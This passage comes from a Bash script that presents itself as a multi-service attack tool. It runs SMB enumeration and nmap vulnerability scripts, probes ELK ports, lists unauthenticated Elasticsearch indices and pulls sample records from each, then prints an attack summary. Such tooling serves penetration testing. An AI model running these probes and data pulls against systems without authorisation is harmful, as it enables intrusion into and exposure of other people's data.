                if ! grep -q "NT_STATUS_ACCESS_DENIED" "$samba_dir/share_${share}_access.txt"; then
                    log_message "warning" "ACCESS TO SHARE '$share' SUCCESSFUL! Check $samba_dir/share_${share}_access.txt"
                fi
            done
        else
            log_message "info" "No SMB shares enumerated or access denied"
        fi
    fi
    
    # Run enum4linux
    if check_tool enum4linux; then
        log_message "info" "Running enum4linux"
        enum4linux -a $TARGET_IP > "$samba_dir/enum4linux.txt" 2>/dev/null
        log_message "info" "Enum4linux results saved to $samba_dir/enum4linux.txt"
        
        # Check for null sessions
        if grep -q "Account Operators" "$samba_dir/enum4linux.txt" || grep -q "Domain Users" "$samba_dir/enum4linux.txt"; then
            log_message "warning" "NULL SESSION MAY BE ALLOWED! User information retrieved. Check $samba_dir/enum4linux.txt"
        fi
    fi
    
    # Check for SMB vulnerabilities with nmap scripts
    if check_tool nmap; then
        log_message "info" "Checking for SMB vulnerabilities"
        nmap -p 139,445 --script smb-vuln* $TARGET_IP -oN "$samba_dir/nmap_vuln_scan.txt" > /dev/null 2>&1
        log_message "info" "SMB vulnerability scan results saved to $samba_dir/nmap_vuln_scan.txt"
        
        # Check for critical vulnerabilities
        if grep -q "VULNERABLE" "$samba_dir/nmap_vuln_scan.txt"; then
            log_message "warning" "CRITICAL SMB VULNERABILITIES DETECTED! Check $samba_dir/nmap_vuln_scan.txt"
        fi
    fi
    
    # Test SMB signing
    if check_tool nmap; then
        log_message "info" "Checking SMB signing configuration"
        nmap -p 445 --script smb-security-mode $TARGET_IP -oN "$samba_dir/smb_signing.txt" > /dev/null 2>&1
        
        # Check if SMB signing is disabled
        if grep -q "message_signing: disabled" "$samba_dir/smb_signing.txt"; then
            log_message "warning" "SMB SIGNING IS DISABLED! This may allow NTLM relay attacks. Check $samba_dir/smb_signing.txt"
        fi
    fi
    
    log_message "info" "Samba server attacks completed"
}

# ELK Stack attack vectors
attack_elk() {
    log_message "info" "Starting ELK Stack attacks on $TARGET_IP"
    
    local elk_dir="$OUTPUT_DIR/elk"
    mkdir -p "$elk_dir"
    
    # Check common ELK ports
    local es_http_port=${CUSTOM_PORT:-9200}  # Elasticsearch HTTP
    local kibana_port=5601                   # Kibana
    local logstash_port=5044                 # Logstash Beats input
    
    # Check Elasticsearch HTTP
    nc -z -w 3 $TARGET_IP $es_http_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "Elasticsearch HTTP port ($es_http_port) is OPEN"
        
        # Get Elasticsearch info
        log_message "info" "Getting Elasticsearch info"
        curl -s "http://$TARGET_IP:$es_http_port/" > "$elk_dir/es_info.txt" 2>/dev/null
        
        # Check if authentication is required
        if grep -q "cluster_name" "$elk_dir/es_info.txt"; then
            log_message "warning" "ELASTICSEARCH WITH NO AUTHENTICATION DETECTED! Check $elk_dir/es_info.txt"
            
            # Try to list indices
            log_message "info" "Attempting to list Elasticsearch indices"
            curl -s "http://$TARGET_IP:$es_http_port/_cat/indices?v" > "$elk_dir/es_indices.txt" 2>/dev/null
            log_message "info" "Elasticsearch indices saved to $elk_dir/es_indices.txt"
            
            # Try to get cluster health
            log_message "info" "Getting cluster health"
            curl -s "http://$TARGET_IP:$es_http_port/_cluster/health?pretty" > "$elk_dir/es_health.txt" 2>/dev/null
            log_message "info" "Elasticsearch health saved to $elk_dir/es_health.txt"
            
            # Check for sensitive indices
            if grep -q "logstash\|kibana\|security\|users" "$elk_dir/es_indices.txt"; then
                log_message "warning" "POTENTIALLY SENSITIVE INDICES FOUND! Check $elk_dir/es_indices.txt"
                
                # Try to access a sample of data from each index
                grep -v "health" "$elk_dir/es_indices.txt" | awk '{print $3}' | while read index; do
                    curl -s "http://$TARGET_IP:$es_http_port/$index/_search?pretty&size=1" > "$elk_dir/index_${index}_sample.txt" 2>/dev/null
                    log_message "info" "Sample from index $index saved to $elk_dir/index_${index}_sample.txt"
                done
            fi
        else
            log_message "info" "Elasticsearch likely requires authentication"
        fi
    else
        log_message "info" "Elasticsearch HTTP port ($es_http_port) is closed"
    fi
    
    # Check Kibana
    nc -z -w 3 $TARGET_IP $kibana_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "Kibana port ($kibana_port) is OPEN"
        
        # Get Kibana info
        log_message "info" "Getting Kibana info"
        curl -s "http://$TARGET_IP:$kibana_port/api/status" > "$elk_dir/kibana_status.txt" 2>/dev/null
        
        # Check if Kibana version is vulnerable
        if grep -q "version" "$elk_dir/kibana_status.txt"; then
            kibana_version=$(grep -o '"number":"[^"]*"' "$elk_dir/kibana_status.txt" | cut -d'"' -f4)
            log_message "info" "Kibana version: $kibana_version"
            
            # Check for known vulnerable versions (example check - would need updating)
            if [[ "$kibana_version" == 6.* ]] || [[ "$kibana_version" == 5.* ]]; then
                log_message "warning" "POTENTIALLY VULNERABLE KIBANA VERSION DETECTED: $kibana_version"
            fi
        fi
    else
        log_message "info" "Kibana port ($kibana_port) is closed"
    fi
    
    # Check for unauthenticated Logstash
    nc -z -w 3 $TARGET_IP $logstash_port > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        log_message "warning" "Logstash Beats port ($logstash_port) is OPEN"
        log_message "info" "Logstash Beats input port is open, could potentially accept unauthenticated logs"
    else
        log_message "info" "Logstash Beats port ($logstash_port) is closed"
    fi
    
    log_message "info" "ELK Stack attacks completed"
}

# Main function
main() {
    # Default values
    TARGET_IP=""
    SERVICE=""
    RUN_ALL=false
    VERBOSE=false
    OUTPUT_FILE=""
    INSTALL_TOOLS=false
    CUSTOM_PORT=""
    
    # Parse command line options
    while [ $# -gt 0 ]; do
        case $1 in
            -h|--help)
                display_banner
                display_help
                exit 0
                ;;
            -t|--target)
                TARGET_IP="$2"
                shift 2
                ;;
            -s|--service)
                SERVICE="$2"
                shift 2
                ;;
            -a|--all)
                RUN_ALL=true
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -o|--output)
                OUTPUT_FILE="$2"
                shift 2
                ;;
            -i|--install)
                INSTALL_TOOLS=true
                shift
                ;;
            -p|--port)
                CUSTOM_PORT="$2"
                shift 2
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                display_help
                exit 1
                ;;
        esac
    done
    
    # Validate required parameters
    if [ -z "$TARGET_IP" ]; then
        echo -e "${RED}[!] Target IP address is required${NC}"
        display_help
        exit 1
    fi
    
    if [ -z "$SERVICE" ]; then
        echo -e "${RED}[!] Service is required${NC}"
        display_help
        exit 1
    fi
    
    # Check if service is valid
    valid_services=("active-directory" "iis" "nginx" "winrm" "apache" "sql" "mail" "ftp" "samba" "elk")
    valid=0
    for s in "${valid_services[@]}"; do
        if [ "$SERVICE" = "$s" ]; then
            valid=1
            break
        fi
    done
    
    if [ $valid -eq 0 ]; then
        echo -e "${RED}[!] Invalid service: $SERVICE${NC}"
        display_help
        exit 1
    fi
    
    # Setup output directory
    timestamp=$(date +%Y%m%d_%H%M%S)
    OUTPUT_DIR="results_${SERVICE}_${timestamp}"
    
    # Display banner
    display_banner
    
    echo -e "${BLUE}[*] Target IP: $TARGET_IP${NC}"
    echo -e "${BLUE}[*] Service: $SERVICE${NC}"
    echo -e "${BLUE}[*] Output directory: $OUTPUT_DIR${NC}"
    
    if [ -n "$OUTPUT_FILE" ]; then
        echo -e "${BLUE}[*] Output file: $OUTPUT_FILE${NC}"
        # Create output file
        touch "$OUTPUT_FILE"
    fi
    
    # Create output directory
    setup_output_dir
    
    # Install tools if requested
    if [ "$INSTALL_TOOLS" = true ]; then
        install_tools
        echo -e "${GREEN}[+] Tools installation completed. Run the script again without -i to perform the attacks.${NC}"
        exit 0
    fi
    
    # Run initial recon
    run_initial_recon
    
    # Run service-specific attacks
    case $SERVICE in
        "active-directory")
            attack_active_directory
            ;;
        "iis")
            attack_iis
            ;;
        "nginx")
            attack_nginx
            ;;
        "winrm")
            attack_winrm
            ;;
        "apache")
            attack_apache
            ;;
        "sql")
            attack_sql
            ;;
        "mail")
            attack_mail
            ;;
        "ftp")
            attack_ftp
            ;;
        "samba")
            attack_samba
            ;;
        "elk")
            attack_elk
            ;;
    esac
    
    # Summary report
    echo
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                      ATTACK SUMMARY REPORT                       ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${CYAN}Target:${NC} $TARGET_IP"
    echo -e "${CYAN}Service:${NC} $SERVICE"
    echo -e "${CYAN}Date/Time:${NC} $(date)"
    echo -e "${CYAN}Results saved to:${NC} $OUTPUT_DIR"
    if [ -n "$OUTPUT_FILE" ]; then
        echo -e "${CYAN}Output log:${NC} $OUTPUT_FILE"
    fi
    echo
    
    # Count warnings (potential vulnerabilities)
    if [ -n "$OUTPUT_FILE" ]; then
        VULN_COUNT=$(grep -c "\[warning\]" "$OUTPUT_FILE")
        echo -e "${YELLOW}Potential vulnerabilities identified: $VULN_COUNT${NC}"
    fi
    
    echo
    echo -e "${GREEN}[+] Attack completed successfully!${NC}"
    echo
}

# Execute main function
main "$@"
